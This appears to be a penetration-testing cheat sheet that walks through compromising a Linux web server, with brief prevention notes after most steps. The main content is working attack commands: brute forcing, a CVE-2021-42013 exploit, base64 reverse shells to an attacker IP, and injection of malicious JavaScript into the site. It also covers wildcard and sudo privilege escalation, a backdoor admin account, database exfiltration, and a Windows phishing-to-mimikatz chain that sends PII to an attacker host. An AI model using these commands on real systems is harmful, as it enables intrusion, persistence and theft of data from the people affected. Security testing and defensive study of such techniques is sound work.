### Nmap Scanning
```bash
target=10.5.20.12
nmap -sSV -p- -Pn -n -O $target -T3
```
#### Prevention
lower the options of scanning to not reveal service information 
use firewall, IDS, DMZ, hide legacy services behind VPN

### Web Content Discovery
```bash
# Directory Enumeration 
gobuster dir -u http://$target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# File Enumeration
gobuster dir -u http://$target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak
```

#### Prevention
disable scanning of directories, and unwanted files

```bash
# httpd.conf
Options -Indexes

# .htaccess 
<FilesMatch "\.(htaccess|htpasswd|env|ini|log|conf)$">
  Order Allow,Deny
  Deny from all
</FilesMatch>
```

### Login Page Bruteforce
```bash
ffuf -u http://10.5.20.12/user/log-in.php -X POST \
-H "Cookie: PHPSESSID=tg6bk1lbboajafumsv03n2t0o8" \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "email=FUZZ1&password=FUZZ2" \
-w ./web_users.txt:FUZZ1 -w /usr/share/nmap/nselib/data/passwords.lst:FUZZ2 \
-fc 401
```

#### Prevention
set up tools like fail2ban or iptables recent module, apache mod_evasive 
use modern languages and libraries, good coding practices
timing limit
ideally MFA, CAPTCHA, WAF

### SSH Bruteforce
```bash
hydra -vV -L ./ssh_users.txt -P /usr/share/nmap/nselib/data/passwords.lst ssh://$target
```
#### Prevention
first thing you always do is harden ssh sshd_config on a new machine
ideally use long key with strong ciphers

```
PasswordAuthentication no
PermitRootLogin no
```

### Unsucessful Path Traversal Used to Read /etc/passwd CVE-2021-42013

```bash
wget -O exploit.sh https://www.exploit-db.com/raw/50406
echo $target > targets.txt
bash exploit.sh targets.txt /etc/passwd
```

#### Prevention
use container isolation
non-root user

### RCE Resulting in Reverse Shell CVE-2021-42013
```bash
bash exploit.sh targets.txt /bin/sh id

nc -lvnp 4444
bash exploit.sh targets.txt /bin/sh "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC41LjMwLjUwLzQ0NDQgMD4mMQ== | base64 -d | bash"
```

#### Prevention
keep up to date your patch management preferably set up automatic updates 

### Shell Upgrade
```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
user@remote:~$ ^Z
user@local:~$ stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'
user@local:~$ echo $TERM
user@local:~$ echo $SHELL
user@local:~$ stty raw -echo; fg  #JUST IN CASE, YOUR SHELL IS zsh!!!! OTHERWISE USE THERE COMMANDS SEPARATELY!
user@remote:~$ stty rows ROWS cols COLS

user@remote:~$ export TERM=xterm-256color # the response from previous `echo $TERM`
user@remote:~$ export SHELL=bash # same with `echo $SHELL`
exec /bin/bash # reload bash to apply the TERM variable
```

#### Prevention
use limited shells

### Loud Linux Enumeration - Linpeas
```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

#### Prevention
it is possible to set up traps on the system for example high priledged canary files that track who reads them and executes something that will eg. isolate the user 

### Malicious Javascript Addition
```bash
nano /usr/local/apache2/htdocs/index.php
# add <script src="./js/captcha.js"></script>
echo "<captcha>" | base64 -d > /usr/local/apache2/htdocs/js/captcha.js
bash -c 'echo "<base64...>" | base64 -d > /usr/local/apache2/htdocs/js/captcha.js'
```

### Cronjob Priviledge Escalation
```bash
nc -lvnp 1337
echo 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC41LjMwLjUwLzEzMzcgMD4mMQ== | base64 -d | bash' > /usr/local/apache2/htdocs/exploit.sh

chmod +x /usr/local/apache2/htdocs/exploit.sh
echo '' > /usr/local/apache2/htdocs/'--checkpoint=1'
echo '' > /usr/local/apache2/htdocs/'--checkpoint-action=exec=sh exploit.sh'
```

#### Prevention
use proper file permissions, prevent using wildcards, use full paths, low priviledged users

### Loud Linux Enumeration - Linenum
```bash
curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

### Sudo Priviledge Escalation
```bash
sudo git help config
!/bin/sh
```

#### Prevention
avoid using NOPASSWD, think about all the options before adding command to sudo (gtfo bins)

### Information Exfiltration + Persistence
```bash
mysqldump -u root webapp | gzip > /opt/database.sql.gz
```

```bash
# 1. Create admin user with sudo privileges
useradd -m -s /bin/bash admin
usermod -aG sudo admin
echo 'admin ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/admin
chmod 440 /etc/sudoers.d/admin

# on kali machine
ssh-keygen -t rsa -b 4096 -f /home/kali/.ssh/majestic -N ""

# 2. Set up SSH key for admin (replace with your actual public key)
mkdir -p /home/admin/.ssh
echo '</home/kali/.ssh/majestic.pub>' > /home/admin/.ssh/authorized_keys
chmod 600 /home/admin/.ssh/authorized_keys
chmod 700 /home/admin/.ssh
chown -R admin:admin /home/admin/.ssh

# 3. Confirm that you are able to login
ssh -i /home/kali/.ssh/majestic admin@10.5.20.12

# 3. Exfiltrate data using scp with a provided private key 
scp -i /home/kali/.ssh/majestic admin@10.5.20.12:/opt/database.sql.gz database.sql.gz
```

### WINDOWS

WKSTN -> DC
———————-
Phish CEO (domain admin) -> weak svc privesc -> run keys persistence -> psexec lateral movement DC (uz si admin na DC) -> mimikatz hashdump
Phish CEO (domain admin) -> psexec lateral movement DC (uz si admin na DC) -> mimikatz hashdump
Phish CEO (domain admin) -> psexec lateral movement DC (uz si admin na DC) -> run keys persistence -> mimikatz hashdump

--> https://github.com/peass-ng/PEASS-ng, https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Portscan/ (fileless), process injection, file exfiltration (pii_udaje.xlsx > Compress-Archive > base64 > IWR > randomip/exfil?data=<base64>) 

randomip = digital ocean / apt group ip
